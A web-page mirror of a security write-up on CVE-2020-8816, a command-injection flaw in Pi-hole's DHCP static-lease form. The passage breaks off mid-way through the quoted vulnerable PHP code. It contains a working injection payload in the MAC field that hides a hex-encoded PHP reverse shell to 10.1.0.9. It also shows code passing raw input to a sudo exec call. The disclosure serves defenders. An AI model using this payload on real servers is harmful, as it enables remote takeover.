<!DOCTYPE html>
<html lang="en">
<head>
    <title>
CVE-2020-8816 &#x2013; Pi-hole Remote Code Execution - linksfor.dev(s)    </title>
    <meta charset="utf-8">
    <link rel="alternate" type="application/rss+xml" title="Linksfor.dev(s) feed" href="https://linksfor.dev/feed.rss" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="google" value="notranslate">
    <link rel="stylesheet" type="text/css" href="/style.min.css" />
    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
    <link rel="icon" href="/favicon.ico" type="image/x-icon">
    <meta property="og:title" content="CVE-2020-8816 &#x2013; Pi-hole Remote Code Execution - linksfor.dev(s)"/>
    <meta property="og:description" content="Impact Pi-hole is affected by a Remote Code Execution vulnerability. An authenticated user of the Web portal can execute arbitrary command with the underlying server with the privileges of the loca&#x2026;"/>
    <meta property="og:type" content="website"/>
    <meta property="og:url" content="https://natedotred.wordpress.com/2020/03/28/cve-2020-8816-pi-hole-remote-code-execution/"/>

<meta property="og:site_name" content="linksfor.dev(s)" />
</head>
<body>
    <div class="devring" style="background: #222">
        <div style="text-align:center">Explore other dev related sites in this ring. If you would like to join this ring <a href="https://devring.club">click here</a>.</div>
        <div class="grid">
            <div style="display: grid; grid-template-columns: .5fr 1fr 1fr 1fr; text-align: center;">
                <span class="devring-title"><a href="https://devring.club/">devring.club</a></span>
                <a href="https://devring.club/sites/1/prev" class="devring-previous">Previous</a>
                <a href="https://devring.club/random" class="devring-random">Random</a>
                <a href="https://devring.club/sites/1/next" class="devring-next">Next</a>
            </div>
        </div>
    </div>
    <div class="grid">
        <h1 style="margin: unset">
<a href="/" style="color:inherit">linksfor.dev(s)</a>
        </h1>
        <title>linksfor.dev(s) - CVE-2020-8816 &#x2013; Pi-hole Remote Code Execution</title>
<div class="readable">
        <h1>CVE-2020-8816 &#x2013; Pi-hole Remote Code Execution</h1>
            <div>Reading time: 8-10 minutes</div>
        <div>Posted here: 28 Mar 2020</div>
        <p><a href="https://natedotred.wordpress.com/2020/03/28/cve-2020-8816-pi-hole-remote-code-execution/">https://natedotred.wordpress.com/2020/03/28/cve-2020-8816-pi-hole-remote-code-execution/</a></p>
        <hr/>
<div id="readability-page-1" class="page"><div id="content">

	<section id="primary">
		<main id="main">

			
<article id="post-31">

	

	
	<div>
		
<h2>Impact</h2>



<div><figure><img data-attachment-id="83" data-permalink="https://natedotred.wordpress.com/capture-7/" data-orig-file="https://natedotred.files.wordpress.com/2020/02/capture-7.png" data-orig-size="967,572" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="capture-7" data-image-description="" data-medium-file="https://natedotred.files.wordpress.com/2020/02/capture-7.png?w=300" data-large-file="https://natedotred.files.wordpress.com/2020/02/capture-7.png?w=750" src="https://natedotred.files.wordpress.com/2020/02/capture-7.png?w=967" alt="" width="363" height="215" srcset="https://natedotred.files.wordpress.com/2020/02/capture-7.png?w=363 363w, https://natedotred.files.wordpress.com/2020/02/capture-7.png?w=726 726w, https://natedotred.files.wordpress.com/2020/02/capture-7.png?w=150 150w, https://natedotred.files.wordpress.com/2020/02/capture-7.png?w=300 300w" sizes="(max-width: 363px) 100vw, 363px"></figure></div>



<p>Pi-hole is affected by a Remote Code Execution vulnerability. An authenticated user of the Web portal can execute arbitrary command with the underlying server with the privileges of the local user executing the service. </p>



<p>Exploitation of this vulnerability can be automated.</p>



<h2>What is Pi-hole?</h2>



<p>Pi-Hole is a DNS server specialized in content-filtering. It also features a DHCP server. According to Pi-hole LLC:</p>



<blockquote><p>The Pi-hole® is a DNS sinkhole that protects your devices from unwanted content, without installing any client-side software.</p></blockquote>



<h2>Who is affected?</h2>



<p>Pi-hole Web interface version 4.3.2 and earlier is affected.</p>



<h2 id="technical-analysis">Technical Analysis</h2>



<p>In order to configure its built-in DHCP server, Pi-hole features a Web-based user interface. From there, users can define static DHCP leases to pin an IP address to a given MAC address.</p>



<p>When processing user input in the form of MAC addresses, the application does not adequately validate nor validate this input before reusing it in a shell command.</p>



<p>While a legitimate MAC address format should be as follows: </p>



<blockquote><p>aaaaaaaaaaaa</p></blockquote>



<p>The MAC address input can be tampered to execute arbitrary code: </p>



<blockquote><p>aaaaaaaaaaaa&amp;&amp;W=${PATH#/???/}&amp;&amp;P=${W%%?????:*}&amp;&amp;X=${PATH#/???/??}&amp;&amp;H=${X%%???:*}&amp;&amp;Z=${PATH#*:/??}&amp;&amp;R=${Z%%/*}&amp;&amp;$P$H$P$IFS-$R$IFS’EXEC(HEX2BIN(“706870202D72202724736F636B3D66736F636B6F70656E282231302E312E302E39222C32323536293B6578656328222F62696E2F7368202D69203C2633203E263320323E263322293B27”));’&amp;&amp;</p></blockquote>



<figure><img data-attachment-id="69" data-permalink="https://natedotred.wordpress.com/capture-6/" data-orig-file="https://natedotred.files.wordpress.com/2020/02/capture-6.png" data-orig-size="1877,1523" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="capture-6" data-image-description="" data-medium-file="https://natedotred.files.wordpress.com/2020/02/capture-6.png?w=300" data-large-file="https://natedotred.files.wordpress.com/2020/02/capture-6.png?w=750" src="https://natedotred.files.wordpress.com/2020/02/capture-6.png?w=1024" alt="" srcset="https://natedotred.files.wordpress.com/2020/02/capture-6.png?w=1024 1024w, https://natedotred.files.wordpress.com/2020/02/capture-6.png?w=150 150w, https://natedotred.files.wordpress.com/2020/02/capture-6.png?w=300 300w, https://natedotred.files.wordpress.com/2020/02/capture-6.png?w=768 768w, https://natedotred.files.wordpress.com/2020/02/capture-6.png 1877w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Affected configuration panel</figcaption></figure>



<p>The following excerpt contains the code that is responsible for this vulnerability. Code sections outside the code path used for exploitation were stripped and important lines of code were highlighted for the sake of clarity.</p>



<div><div>



<div><div id="highlighter_456801"><div><div><p><code>&lt;?php</code></p><p><code>if</code><code>(</code><code>basename</code><code>(</code><code>$_SERVER</code><code>[</code><code>'SCRIPT_FILENAME'</code><code>]) !== </code><code>"settings.php"</code><code>)</code></p><p><code>{</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;</code><code>die</code><code>(</code><code>"Direct access to this script is forbidden!"</code><code>);</code></p><p><code>}</code></p><p><code>function</code> <code>validMAC(</code><code>$mac_addr</code><code>)</code></p><p><code>{</code></p><p><code>&nbsp;&nbsp;</code><code>return</code> <code>(preg_match(</code><code>'/([a-fA-F0-9]{2}[:]?){6}/'</code><code>, </code><code>$mac_addr</code><code>) == 1);</code></p><p><code>}</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;</code><code>$adlist</code> <code>= readAdlists();</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;</code><code>$DNSserverslist</code> <code>= readDNSserversList();</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;</code><code>$error</code> <code>= </code><code>""</code><code>;</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;</code><code>$success</code> <code>= </code><code>""</code><code>;</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;</code><code>if</code><code>(isset(</code><code>$_POST</code><code>[</code><code>"field"</code><code>]))</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;</code><code>{</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>check_csrf(isset(</code><code>$_POST</code><code>[</code><code>"token"</code><code>]) ? </code><code>$_POST</code><code>[</code><code>"token"</code><code>] : </code><code>""</code><code>);</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>switch</code> <code>(</code><code>$_POST</code><code>[</code><code>"field"</code><code>]) {</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>case</code> <code>"DHCP"</code><code>:</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>if</code><code>(isset(</code><code>$_POST</code><code>[</code><code>"addstatic"</code><code>]))</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>{</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>$mac</code> <code>= </code><code>$_POST</code><code>[</code><code>"AddMAC"</code><code>];</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>$ip</code> <code>= </code><code>$_POST</code><code>[</code><code>"AddIP"</code><code>];</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>$hostname</code> <code>= </code><code>$_POST</code><code>[</code><code>"AddHostname"</code><code>];</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>if</code><code>(!validMAC(</code><code>$mac</code><code>))</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>{</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>$error</code> <code>.= </code><code>"MAC address ("</code><code>.htmlspecialchars(</code><code>$mac</code><code>).</code><code>") is invalid!&lt;br&gt;"</code><code>;</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>}</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>$mac</code> <code>= </code><code>strtoupper</code><code>(</code><code>$mac</code><code>);</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>if</code><code>(!validIP(</code><code>$ip</code><code>) &amp;&amp; </code><code>strlen</code><code>(</code><code>$ip</code><code>) &gt; 0)</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>{</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>$error</code> <code>.= </code><code>"IP address ("</code><code>.htmlspecialchars(</code><code>$ip</code><code>).</code><code>") is invalid!&lt;br&gt;"</code><code>;</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>}</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>if</code><code>(!validDomain(</code><code>$hostname</code><code>) &amp;&amp; </code><code>strlen</code><code>(</code><code>$hostname</code><code>) &gt; 0)</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>{</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>$error</code> <code>.= </code><code>"Host name ("</code><code>.htmlspecialchars(</code><code>$hostname</code><code>).</code><code>") is invalid!&lt;br&gt;"</code><code>;</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>}</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>if</code><code>(</code><code>strlen</code><code>(</code><code>$hostname</code><code>) == 0 &amp;&amp; </code><code>strlen</code><code>(</code><code>$ip</code><code>) == 0)</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>{</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>$error</code> <code>.= </code><code>"You can not omit both the IP address and the host name!&lt;br&gt;"</code><code>;</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>}</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>if</code><code>(</code><code>strlen</code><code>(</code><code>$hostname</code><code>) == 0)</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>$hostname</code> <code>= </code><code>"nohost"</code><code>;</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>if</code><code>(</code><code>strlen</code><code>(</code><code>$ip</code><code>) == 0)</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>$ip</code> <code>= </code><code>"noip"</code><code>;</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>readStaticLeasesFile();</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>foreach</code><code>(</code><code>$dhcp_static_leases</code> <code>as</code> <code>$lease</code><code>) {</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>if</code><code>(</code><code>$lease</code><code>[</code><code>"hwaddr"</code><code>] === </code><code>$mac</code><code>)</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>{</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>$error</code> <code>.= </code><code>"Static release for MAC address ("</code><code>.htmlspecialchars(</code><code>$mac</code><code>).</code><code>") already defined!&lt;br&gt;"</code><code>;</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>break</code><code>;</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>}</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>if</code><code>(</code><code>$ip</code> <code>!== </code><code>"noip"</code> <code>&amp;&amp; </code><code>$lease</code><code>[</code><code>"IP"</code><code>] === </code><code>$ip</code><code>)</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>{</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>$error</code> <code>.= </code><code>"Static lease for IP address ("</code><code>.htmlspecialchars(</code><code>$ip</code><code>).</code><code>") already defined!&lt;br&gt;"</code><code>;</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>break</code><code>;</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>}</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>if</code><code>(</code><code>$lease</code><code>[</code><code>"host"</code><code>] === </code><code>$hostname</code><code>)</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>{</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>$error</code> <code>.= </code><code>"Static lease for hostname ("</code><code>.htmlspecialchars(</code><code>$hostname</code><code>).</code><code>") already defined!&lt;br&gt;"</code><code>;</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>break</code><code>;</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>}</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>}</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>if</code><code>(!</code><code>strlen</code><code>(</code><code>$error</code><code>))</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>{</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>exec</code><code>(</code><code>"sudo pihole -a addstaticdhcp "</code><code>.</code><code>$mac</code><code>.</code><code>" "</code><code>.</code><code>$ip</code><code>.</code><code>" "</code><code>.</code><code>$hostname</code><code>);</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>$success</code> <code>.= </code><code>"A new static address has been added"</code><code>;</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>}</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>break</code><code>;</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>}</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>if</code><code>(isset(</code><code>$_POST</code><code>[</code><code>"removestatic"</code><code>]))</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>{</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>$mac</code> <code>= </code><code>$_POST</code><code>[</code><code>"removestatic"</code><code>];</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>if</code><code>(!validMAC(</code><code>$mac</code><code>))</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>{</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>$error</code> <code>.= </code><code>"MAC address ("</code><code>.htmlspecialchars(</code><code>$mac</code><code>).</code><code>") is invalid!&lt;br&gt;"</code><code>;</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>}</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>$mac</code> <code>= 